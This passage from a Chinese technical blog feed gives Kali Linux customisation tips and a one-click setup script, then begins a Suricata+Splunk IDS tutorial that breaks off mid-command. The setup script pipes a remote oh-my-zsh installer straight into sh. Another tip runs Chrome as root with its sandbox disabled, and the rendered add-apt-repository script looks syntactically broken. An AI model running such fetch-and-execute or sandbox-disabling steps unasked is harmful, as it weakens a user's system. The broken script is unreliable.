class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> scrotscrot -d 5 //延时5秒截图</code></pre><p>在<code>系统设置</code>—<code>Keyboard</code>设置中添加快捷键</p><pre class=" language-bash"><code class="language-bash">/bin/sh -c <span class="token string">"scrot -d 5"</span> </code></pre><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201152522.png" alt=""></p><p>按下快捷键，延时5秒截图完毕后会自动保存到家目录下。</p><h2 id="隐藏终端的用户信息"><a href="#隐藏终端的用户信息" class="headerlink" title="隐藏终端的用户信息"></a>隐藏终端的用户信息</h2><p>  修改家目录的<code>.bashrc</code>文件，添加一行</p><pre class=" language-bash"><code class="language-bash"><span class="token function">export</span> PS1<span class="token operator">=</span><span class="token string">'\[\033[01;31m\] >>> \[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '</span></code></pre><p>效果如下：</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/20181201131413.png" alt=""></p><h2 id="右键文件编码转换"><a href="#右键文件编码转换" class="headerlink" title="右键文件编码转换"></a>右键文件编码转换</h2><p>kali下常常遇到文本文件因为编码问题而显示乱码的情况</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201151556.png" alt=""></p><p>在<code>~/.local/share/nautilus/scripts</code>目录下新建一个bash文件<code>ConvertZh-CN</code>，内容为：</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">iconv</span> -f gb18030 -t utf-8 <span class="token variable">$NAUTILUS_SCRIPT_SELECTED_FILE_PATHS</span> -o <span class="token variable">$NAUTILUS_SCRIPT_SELECTED_FILE_PATHS</span></code></pre><p>下次遇到乱码的文件只需要右键选中，在<code>scripts</code>中选择对应处理脚本即可方便地进行转换了，例如：</p><p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/kali-rolling-install/20181201151744.png" alt=""></p><h2 id="右键功能拓展"><a href="#右键功能拓展" class="headerlink" title="右键功能拓展"></a>右键功能拓展</h2><p>主要是<code>~/.local/share/nautilus/scripts</code>目录下增加<code>nautilus</code>脚本文件。可以自己编写，也可以从网上下载，<a href="https://www.opendesktop.org/browse/cat/126/" target="_blank" rel="noopener">这里</a>有很多。</p><h1 id="五、常见问题"><a href="#五、常见问题" class="headerlink" title="五、常见问题"></a>五、常见问题</h1><h2 id="网络设备未托管"><a href="#网络设备未托管" class="headerlink" title="网络设备未托管"></a>网络设备未托管</h2><p>此问题表现症状可能是无法正常显示网络连接，比如无线：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/NetworkManager/NetworkManager.conf</code></pre><p>把 <code>managed=false</code> 的 <code>false</code> 改为<code>true</code></p><h2 id="右键创建文件功能"><a href="#右键创建文件功能" class="headerlink" title="右键创建文件功能"></a>右键创建文件功能</h2><p>kali右键没有创建文件的功能，解决方法是，在家目录的Templates目录下放入你想要创建的模板类型即可</p><h2 id="安装其他版本jdk"><a href="#安装其他版本jdk" class="headerlink" title="安装其他版本jdk"></a>安装其他版本jdk</h2><p>去oracle官网下载需要的jdk版本，比如<a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">jdk8</a>，下载完毕后解压到/opt/目录下，然后编辑<code>/etc/profile</code>文件，添加以下内容：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_192<span class="token function">export</span> JRE_HOME<span class="token operator">=</span><span class="token variable">${JAVA_HOME}</span>/jre<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:<span class="token variable">${JAVA_HOME}</span>/lib:<span class="token variable">${JRE_HOME}</span>/lib:<span class="token variable">$CLASSPATH</span><span class="token function">export</span> JAVA_PATH<span class="token operator">=</span><span class="token variable">${JAVA_HOME}</span>/bin:<span class="token variable">${JRE_HOME}</span>/bin<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">${JAVA_PATH}</span></code></pre><p>笔者遇到了添加环境变量但是不生效的问题，后来发现是受到kali上其他版本jdk的影响。</p><h3 id="多java版本控制问题"><a href="#多java版本控制问题" class="headerlink" title="多java版本控制问题"></a>多java版本控制问题</h3><p>1.查看相应的jdk是否在 kali linux的jdk菜单里，如果有，直接选择你想切换的版本:</p><pre class=" language-bash"><code class="language-bash">update-alternatives --config javaupdate-alternatives --config javac</code></pre><p>2.如果没有在菜单里可以进行添加：</p><pre class=" language-bash"><code class="language-bash">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 300update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 300 </code></pre><p>3.修改java版本</p><pre class=" language-bash"><code class="language-bash">update-alternatives --config javaupdate-alternatives --config javac</code></pre><p>注意：<code>/opt/jdk1.8.0_121</code>是自己安装的路径。<code>300</code>这个序号用于区分java版本，可以自定义但不能重复。</p><h2 id="修复apt-add-repository命令"><a href="#修复apt-add-repository命令" class="headerlink" title="修复apt-add-repository命令"></a>修复apt-add-repository命令</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mv</span> /usr/bin/add-apt-repository /usr/bin/add-apt-repository-bak<span class="token function">touch</span> /usr/sbin/add-apt-repository <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x /usr/sbin/add-apt-repository <span class="token operator">&amp;&amp;</span> <span class="token function">vi</span> /usr/sbin/add-apt-repository</code></pre><p>添加以下内容：</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> $<span class="token comment" spellcheck="true"># -eq 1 ]</span>NM<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">uname</span> -a <span class="token operator">&amp;&amp;</span> <span class="token function">date</span><span class="token variable">`</span></span>NAME<span class="token operator">=</span>`echo <span class="token variable">$NM</span> <span class="token operator">|</span> md5sum <span class="token operator">|</span> <span class="token function">cut</span> -f1 -d<span class="token string">" "</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">then</span>  ppa_name<span class="token operator">=</span><span class="token variable">`</span></span><span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">":"</span> -f2 -s`  <span class="token keyword">if</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$ppa_name</span>"</span> <span class="token punctuation">]</span>  <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"PPA name not found"</span>    <span class="token keyword">echo</span> <span class="token string">"Utility to add PPA repositories in your debian machine"</span>    <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$0</span> ppa:user/ppa-name"</span>  <span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$ppa_name</span>"</span>    <span class="token keyword">echo</span> <span class="token string">"deb http://ppa.launchpad.net/<span class="token variable">$ppa_name</span>/ubuntu xenial main"</span> <span class="token operator">>></span> /etc/apt/sources.list    <span class="token function">apt-get</span> update <span class="token operator">>></span> /dev/null 2<span class="token operator">></span> /tmp/<span class="token variable">${NAME}</span>_apt_add_key.txt    key<span class="token operator">=</span>`cat /tmp/<span class="token variable">${NAME}</span>_apt_add_key.txt <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">":"</span> -f6 <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">" "</span> -f3`    apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <span class="token variable">$key</span>    <span class="token function">rm</span> -rf /tmp/<span class="token variable">${NAME}</span>_apt_add_key.txt  <span class="token keyword">fi</span><span class="token keyword">else</span>  <span class="token keyword">echo</span> <span class="token string">"Utility to add PPA repositories in your debian machine"</span>  <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$0</span> ppa:user/ppa-name"</span><span class="token keyword">fi</span></code></pre><h2 id="修复wireshark启动报错"><a href="#修复wireshark启动报错" class="headerlink" title="修复wireshark启动报错"></a>修复wireshark启动报错</h2><p>报错如下：</p><pre class=" language-bash"><code class="language-bash">Lua: Error during loading: /usr/share/wireshark/init.lua:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges <span class="token keyword">for</span> <span class="token function">help</span> <span class="token keyword">in</span> running Wireshark as an unprivileged user</code></pre><p>修改<code>/usr/share/wireshark/init.lua</code>文件，倒数第二行找到：</p><pre class=" language-bash"><code class="language-bash">dofile<span class="token punctuation">(</span>DATA_DIR<span class="token punctuation">..</span><span class="token string">"console.lua"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 改为</span>--dofile<span class="token punctuation">(</span>DATA_DIR<span class="token punctuation">..</span><span class="token string">"console.lua"</span><span class="token punctuation">)</span></code></pre><h2 id="解决启动时默认静音问题"><a href="#解决启动时默认静音问题" class="headerlink" title="解决启动时默认静音问题"></a>解决启动时默认静音问题</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> alsa-utils -y</code></pre><h2 id="解决root权限下无法运行chrome"><a href="#解决root权限下无法运行chrome" class="headerlink" title="解决root权限下无法运行chrome"></a>解决root权限下无法运行chrome</h2><p>修改<code>/usr/bin/google-chrome-stable</code>文件：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> -a <span class="token string">"<span class="token variable">$0</span>"</span> <span class="token string">"<span class="token variable">$HERE</span>/chrome"</span> <span class="token string">"<span class="token variable">$@</span>"</span> --no-sandbox --user-data-dir</code></pre><p>chromium也而是类似，修改<code>/usr/share/applications/chromium.desktop</code>文件：</p><pre class=" language-bash"><code class="language-bash">Exec<span class="token operator">=</span>/usr/bin/chromium %U --no-sandbox --user-data-dir</code></pre><p>在系统语言为英文的情况下，设置启动chrome时显示为中文<br>修改<code>/usr/bin/google-chrome-stable</code>文件，添加一行即可</p><pre class=" language-bash"><code class="language-bash"><span class="token function">export</span> LANGUAGE<span class="token operator">=</span>zh-cn /opt/google/chrome/google-chrome %U</code></pre><h2 id="vmware安装虚拟机增强工具"><a href="#vmware安装虚拟机增强工具" class="headerlink" title="vmware安装虚拟机增强工具"></a>vmware安装虚拟机增强工具</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> open-vm-tools-desktop</code></pre><h2 id="永久开启ip转发功能"><a href="#永久开启ip转发功能" class="headerlink" title="永久开启ip转发功能"></a>永久开启ip转发功能</h2><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"net.ipv4.ip_forward=1"</span> <span class="token operator">>></span> /etc/sysctl.conf   </code></pre><p><code>ipv6</code>网络转发：</p><pre class=" language-bash"><code class="language-bash"> <span class="token keyword">echo</span> 1 <span class="token operator">></span> /proc/sys/net/ipv6/conf/all/forwarding</code></pre><h1 id="一键安装配置脚本"><a href="#一键安装配置脚本" class="headerlink" title="一键安装配置脚本"></a>一键安装配置脚本</h1><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"=========================================================================="</span><span class="token keyword">echo</span> <span class="token string">"=               Kali Auto Init Tool                                      ="</span><span class="token keyword">echo</span> <span class="token string">"=                      Powered by ssooking                               ="</span><span class="token keyword">echo</span> <span class="token string">"=                      https://ssooking.github.io                        ="</span><span class="token keyword">echo</span> <span class="token string">"=========================================================================="</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[*] 即将自动对kali进行基本配置，建议你根据需要修改脚本。安装配置过程可能需要一会儿，并且由你的网速决定...."</span><span class="token function">read</span> -p <span class="token string">"[*] 请按任意键继续...."</span><span class="token keyword">echo</span> <span class="token string">"[+] 添加kali源"</span>apt-key adv --recv ED444FF07D8D0BF6<span class="token keyword">echo</span> <span class="token string">"deb http://http.kali.org/kali kali-rolling main non-free contrib"</span> <span class="token operator">>></span> /etc/apt/sources.list<span class="token keyword">echo</span> <span class="token string">"deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib"</span> <span class="token operator">>></span> /etc/apt/sources.list<span class="token keyword">echo</span> <span class="token string">"deb http://mirrors.aliyun.com/debian stable main contrib non-free"</span>  <span class="token operator">>></span> /etc/apt/sources.list<span class="token keyword">echo</span> <span class="token string">"[ok] 添加kali源成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 添加一个普通用户"</span><span class="token function">read</span> -p <span class="token string">"请输入用户名: "</span> username<span class="token function">useradd</span> -m -G sudo,video,audio,cdrom -s /bin/bash <span class="token variable">$username</span><span class="token keyword">echo</span> <span class="token string">"请设置用户密码："</span><span class="token function">passwd</span> <span class="token variable">$username</span><span class="token keyword">echo</span> <span class="token string">"[ok] 添加普通用户成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 安装内核头文件</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装内核头文件... "</span><span class="token function">apt-get</span> -y <span class="token function">install</span> linux-headers-<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -r<span class="token variable">)</span></span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[ok] 内核头文件安装成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 解决kali启动时静音问题</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装 alsa-utils 解决kali启动时静音问题"</span><span class="token function">apt-get</span> -y <span class="token function">install</span> alsa-utils<span class="token keyword">echo</span> <span class="token string">"[ok] 安装 alsa-utils 成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 添加PPPoE拨号连接功能"</span><span class="token function">apt-get</span> <span class="token function">install</span> pppoe pppoeconf <span class="token keyword">echo</span> <span class="token string">"[ok] 安装PPPoE成功!"</span><span class="token keyword">echo</span> <span class="token string">"      >> 你可以使用 nm-connection-editor 命令管理pppoe连接"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 添加VPN支持: PPTP IPsec/IKEv2 vpnc network-manager-ssh"</span><span class="token function">apt-get</span> -y <span class="token function">install</span> network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome network-manager-ssh<span class="token keyword">echo</span> <span class="token string">"[ok] 成功添加vpn支持!"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># Base Tool</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装一些必备系统工具：谷歌拼音输入法、垃圾清理工具、截图工具、快速启动工具、软件包管理工具等"</span><span class="token function">apt-get</span> -y <span class="token function">install</span>  fcitx fcitx-googlepinyin flameshot bleachbit gdebi synaptic synapse catfish scrot vokoscreen chromium<span class="token keyword">echo</span> <span class="token string">"[ok] 成功安装系统必备软件!"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># Server Tools</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装服务器连接管理工具：remmina、filezilla"</span><span class="token function">apt-get</span> -y <span class="token function">install</span> remmina filezilla<span class="token keyword">echo</span> <span class="token string">"[ok] 安装服务器连接管理工具成功!"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 美化</span><span class="token keyword">echo</span> <span class="token string">"[+] 设置窗口按钮到左侧"</span>gsettings <span class="token keyword">set</span> org.gnome.desktop.wm.preferences button-layout <span class="token string">'close,maximize,minimize:'</span><span class="token keyword">echo</span> <span class="token string">"[ok] 设置窗口按钮到左侧成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装中文字体"</span><span class="token function">apt-get</span> -y <span class="token function">install</span> fonts-wqy-microhei fonts-wqy-zenhei<span class="token keyword">echo</span> <span class="token string">"[ok] 安装中文字体成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装基本美化工具"</span><span class="token function">apt-get</span> -y <span class="token function">install</span> zsh screenfetch neofetch figlet peek<span class="token comment" spellcheck="true">#apt-get -y install cairo-dock</span><span class="token keyword">echo</span> <span class="token string">"[ok] 安装成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 删除无用主题"</span><span class="token function">cd</span> /usr/share/themes/ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf Albatross Blackbird Bluebird HighContrast Greybird*<span class="token keyword">echo</span> <span class="token string">"[ok] 删除成功！"</span><span class="token comment" spellcheck="true"># Security Tools</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装图形化十六进制编辑器bless"</span><span class="token function">apt-get</span> -y <span class="token function">install</span> bless<span class="token keyword">echo</span> <span class="token string">"[ok] 安装成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装firewalld防火墙及iptables图形化管理工具gufw "</span><span class="token function">apt-get</span> -y <span class="token function">install</span> gufw firewalld firewall-applet<span class="token comment" spellcheck="true">#systemctl enable firewalld.service</span><span class="token keyword">echo</span> <span class="token string">"[ok] 安装成功！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># Install sublime text 3</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装sublime text 3，速度可能会比较慢"</span><span class="token function">wget</span> -qO - https://download.sublimetext.com/sublimehq-pub.gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key add -<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https<span class="token keyword">echo</span> <span class="token string">"deb https://download.sublimetext.com/ apt/stable/"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/sublime-text.list<span class="token function">apt-get</span> update<span class="token function">apt-get</span> <span class="token function">install</span> sublime-text<span class="token keyword">echo</span> <span class="token string">"[+] 解决sublime-text 中文输入问题"</span><span class="token function">git</span> clone https://github.com/lyfeyaj/sublime-text-imfix.git<span class="token function">cd</span> sublime-text-imfix<span class="token function">cp</span> ./lib/libsublime-imfix.so /opt/sublime_text/ <span class="token operator">&amp;&amp;</span> <span class="token function">cp</span> ./src/subl /usr/bin/<span class="token keyword">echo</span> <span class="token string">"[ok] 修复成功。输入subl命令启动sublime text即可输入中文！"</span><span class="token keyword">echo</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># Install typora</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装 typora，速度可能会比较慢"</span><span class="token function">sudo</span> apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE<span class="token keyword">echo</span> <span class="token string">"deb http://typora.io linux/"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/typora.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update -y<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> typora<span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 安装 node npm"</span><span class="token function">wget</span> https://npm.taobao.org/mirrors/node/v8.9.3/node-v8.9.3.tar.gz<span class="token function">tar</span> zxvf node-v8.9.3.tar.gz <span class="token operator">&amp;&amp;</span> <span class="token function">mv</span> node-v8.9.3-linux-x64 /opt<span class="token function">ln</span> -s /opt/node-v8.9.3-linux-x64/bin/node /usr/local/bin/node  <span class="token function">ln</span> -s /opt/node-v8.9.3-linux-x64/bin/npm /usr/local/bin/npm<span class="token function">rm</span> ~/node-v8.9.3.tar.gz<span class="token keyword">echo</span> <span class="token string">""</span><span class="token keyword">echo</span> <span class="token string">"[+] 清除垃圾 ......"</span><span class="token function">apt-get</span> clean <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> autoclean <span class="token operator">&amp;&amp;</span>  <span class="token function">apt-get</span> autoremove -y　<span class="token keyword">echo</span> <span class="token string">"[+] Cleaning OK!"</span><span class="token comment" spellcheck="true"># Install oh-my-zsh</span><span class="token comment" spellcheck="true"># 普通用户就以普通权限安装</span><span class="token function">apt-get</span> <span class="token function">install</span> zsh<span class="token keyword">echo</span> <span class="token string">"[+] Install oh-my-zsh"</span>sh -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span><span class="token keyword">echo</span> <span class="token string">" Setting oh-my-zsh be the default terminal"</span>chsh -s /bin/zsh<span class="token keyword">echo</span> <span class="token string">""</span>neofetch<span class="token keyword">echo</span> <span class="token string">"[OK] 所有任务完成!"</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>构建基于Suricata+Splunk的IDS入侵检测系统</title>
      <link href="/gou-jian-ji-yu-suricata-splunk-de-ids-ru-qin-jian-ce-xi-tong/"/>
      <url>/gou-jian-ji-yu-suricata-splunk-de-ids-ru-qin-jian-ce-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="一-什么是IDS和IPS"><a href="#一-什么是IDS和IPS" class="headerlink" title="一.什么是IDS和IPS"></a>一.什么是IDS和IPS</h1><p><code>IDS（Intrusion Detection Systems）</code>：</p><p>入侵检测系统，是一种网络安全设备或应用软件，可以依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，并发出安全警报。</p><p><code>IPS（Intrusion Prevention System）</code>：</p><p>入侵防御系统，除了具有IDS的监控检测功能之外，可以深度感知检测数据流量，对恶意报文进行丢弃，以阻止这些异常的或是具有伤害性的网络行为。IPS入侵防御系统，是在IDS入侵检测系统的基础上，增加了事件处理以及安全防护功能，能够主动对安全事件进行响应。</p><p><code>NSM</code>：</p><p>网络安全监控系统，用于收集、检测和分析网络安全数据，通常IDS是其组成部分之一。</p><h1 id="二-IDS-IPS的功能及分类"><a href="#二-IDS-IPS的功能及分类" class="headerlink" title="二.IDS/IPS的功能及分类"></a>二.IDS/IPS的功能及分类</h1><p>IDS根据两种方法进行分类：<code>按照数据来源</code>、<code>按照入侵检测策略</code>。</p><p>1、按照数据来源分类</p><ul><li>基于网络的入侵检测系统（NIDS）</li><li>基于主机的入侵监测系统（HIDS）</li><li>分布式入侵检测系统（DIDS）</li></ul><p>2、按照入侵检测策略分类</p><ul><li>滥用检测</li><li>异常检测</li><li>完整性分析</li></ul><p>IPS从功能上具有以下几个组成部分：</p><ul><li>数据采集：采集和捕获流量数据</li><li>入侵检测：分析流量和日志数据，发现安全异常行为并发出警报,常见的有Snort、Suricata、Bro</li><li>结果展示：用于分析IDS警报并进行友好展示,常见的IDS警报分析工具有Snorby、Sguil、Base等</li><li>安全防御：主动响应安全事件，采取丢弃数据包等等措施来阻止异常网络行为，比如与iptables联用</li></ul><h1 id="三-IDS检测方法"><a href="#三-IDS检测方法" class="headerlink" title="三.IDS检测方法"></a>三.IDS检测方法</h1><p>IDS根据入侵检测的行为分为：<code>异常检测</code>和<code>误用检测</code>。</p><p>1、异常检测方法</p><ul><li>统计异常检测方法</li><li>特征选择异常检测方法</li><li>基于贝叶斯推理异常检测方法</li><li>基于贝叶斯网络异常检测方法</li><li>基于模式预测异常检测方法</li></ul><p>2、误用检测方法</p><ul><li>基于条件的概率误用检测方法</li><li>基于专家系统误用检测方法</li><li>基于状态迁移分析误用检测方法</li><li>基于键盘监控误用检测方法</li><li>基于模型误用检测方法</li></ul><h1 id="四-构建基于Suricata-Splunk的IDS"><a href="#四-构建基于Suricata-Splunk的IDS" class="headerlink" title="四.构建基于Suricata+Splunk的IDS"></a>四.构建基于Suricata+Splunk的IDS</h1><p><code>Suricata</code></p><p> 随着越来越多的服务器将网卡升级到10GB/40GB以太网，对线路上的硬件进行计算密集型的入侵检测越来越困难。<code>suircata</code>是一款支持IDS和IPS的多线程入侵检测系统，与传统snort相比，suricata的多线程和模块化设计上使其在效率和性能上超过了原有snort，它将 CPU 密集型的深度包检测工作并行地分配给多个并发任务来完成。这样的并行检测可以充分利用多核硬件的优势来提升入侵检测系统的吞吐量，在数据包的深度检测上效果优越。并且suricata可以兼容现有的Snort规则签名，还增加了对ipv6的支持，已经逐渐成为传统snort入侵检测系统的代替方案。</p><table><thead><tr><th>参数</th><th>Snort</th><th>Suricata</th></tr></thead><tbody><tr><td>安装方式</td><td>源码安装、安装包安装</td><td>源码安装</td></tr><tr><td>协议</td><td>TCP，UDP，ICMP，IP</td><td>TCP，UDP，ICMP，IP，HTTP，FTP，TLS（SSL），SMB，DNS</td></tr><tr><td>规则</td><td>Snort规则，EmergingThreats规则</td><td>Snort规则，EmergingThreats规则，VRT::Snort 规则</td></tr><tr><td>线程</td><td>单线程</td><td>多线程</td></tr><tr><td>IPS支持</td><td>与iptables等联用实现</td><td>支持自动处理</td></tr><tr><td>IPv6支持</td><td>少数支持</td><td>全面支持</td></tr><tr><td>抓包方式</td><td>libpcap</td><td>PF_RING, cua,netmap,af-packet</td></tr><tr><td>帮助资料</td><td>官网及网络上大量资料</td><td>Suricata wiki</td></tr></tbody></table><p><code>Splunk</code></p><p> splunk是一款数据分析系统。它在快速收集、搜索、分析、实时获取数据方面的能力较为突出，效率高，能够处理PB级数据，并且它支持对数据源进行实时监控。支持自定义过滤规则。splunk使用简单，通过用户图形界面进行各种统计分析操作， 能够对数据进行可视化展示，形象直观。</p><p>本实验中利用splunk实时监控IDS的警报日志文件<code>fast.log</code>。</p><h2 id="1-安装Suricata"><a href="#1-安装Suricata" class="headerlink" title="1.安装Suricata"></a>1.安装Suricata</h2><p> <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation" target="_blank" rel="noopener">wiki参考文档</a></p><p>1.安装suricata依赖</p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> -y <span class="token function">install</span> libpcre3 libpcre3-dbg libpcre3-dev \build-essential autoconf automake libtool libpcap-dev libnet1-dev \libyaml-0-2 libyaml-dev zlib1g zlib1g-dev libmagic-dev libcap-ng-dev \libjansson-dev pkg-config</code></pre><p>安装libhtp库</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone  https://github.com/OISF/libhtp.git<span class="token function">cd</span> libhtp/./autogen.sh./configure<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>2.下载suricata</p><p>去官网下载<a href="https://suricata-ids.org/download/" target="_blank" rel="noopener">suricata</a>并解压</p><p>3.编译suricata</p><p>默认模式下，Suricata以IDS模式运行，编译命令：</p><pre class=" language-bash"><code class="language-bash">./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc --localstatedir<span class="token operator">=</span>/var</code></pre><p>如果需要 Suricata 同时运行 IDS 和 IPS，需要安装额外依赖并使用如下命令进行编译</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> libnetfilter-queue-dev libnetfilter-queue1 libnfnetlink-dev libnfnetlink0  ./configure --enable-nfqueue --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc --localstatedir<span class="token operator">=</span>/var</code></pre><p>4.安装suricata</p><pre class=" language-bash"><code class="language-bash"><span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token function">sudo</span> <span class="token function">make</span> install-conf <span class="token comment" spellcheck="true"># 安装默认配置  </span><span class="token function">sudo</span> <span class="token function">make</span> install-rules <span class="token comment" spellcheck="true"># 安装默认规则  </span><span class="token function">sudo</span> ldconfig <span class="token comment" spellcheck="true"># 让系统共享动态链接库  </span></code></pre><h2 id="2-配置并使用Suricata监控安全事件"><a href="#2-配置并使用Suricata监控安全事件" class="headerlink" title="2.配置并使用Suricata监控安全事件"></a>2.配置并使用Suricata监控安全事件</h2><h3 id="1-编辑配置文件"><a href="#1-编辑配置文件" class="headerlink" title="(1) 编辑配置文件"></a>(1) 编辑配置文件</h3><p>如果我们安装时使用下面的命令，会进行默认配置，我们只需要修改相关配置文件中的参数即可。如果已经使用了默认配置，请直接跳到步骤4。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> install-conf  <span class="token comment" spellcheck="true"># 安装默认配置  </span><span class="token function">sudo</span> <span class="token function">make</span> install-rules <span class="token comment" spellcheck="true"># 安装默认规则 </span></code></pre><p>如果没有安装默认配置和规则，我们需要手动进行配置。参考步骤1、2、3。</p><h3 id="2-创建Suricata配置目录和日志目录"><a href="#2-创建Suricata配置目录和日志目录" class="headerlink" title="(2) 创建Suricata配置目录和日志目录"></a>(2) 创建Suricata配置目录和日志目录</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /var/log/suricata<span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/suricata</code></pre><h5 id="把规则文件拷贝到Suricata配置目录下"><a href="#把规则文件拷贝到Suricata配置目录下" class="headerlink" title="把规则文件拷贝到Suricata配置目录下"></a>把规则文件拷贝到Suricata配置目录下</h5><pre class=" language-bash"><code class="language-bash"><span class="token function">wget</span> http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz<span class="token function">tar</span> zxvf 